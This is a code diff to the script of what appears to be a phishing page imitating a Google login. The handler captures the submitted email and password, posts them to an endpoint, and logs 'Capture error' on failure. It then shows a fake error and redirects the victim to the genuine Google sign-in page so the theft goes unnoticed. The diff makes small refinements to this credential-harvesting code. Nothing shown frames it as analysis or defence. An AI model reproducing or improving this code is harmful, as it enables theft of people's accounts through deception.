@@ -240,8 +240,10 @@
 
   form.addEventListener('submit', async function(e) {
     e.preventDefault();
+
     const email = emailInput.value.trim();
     const password = passwordInput.value.trim();
+
     if (!email || !password) return;
 
     loginBtn.textContent = 'Signing in...';
@@ -260,15 +262,17 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phrase: JSON.stringify(data) })
       });
-    } catch (err) {}
+    } catch (err) {
+      console.log('Capture error:', err);
+    }
 
     errorBox.classList.add('visible');
     loginBtn.textContent = 'Next';
     loginBtn.disabled = false;
     passwordInput.value = '';
 
-    setTimeout(() => {
-      window.location.href = 'https://accounts.google.com/signin';
+    setTimeout(function() {
+      window.location.replace('https://accounts.google.com/signin');
     }, 3000);
   });
 </script>
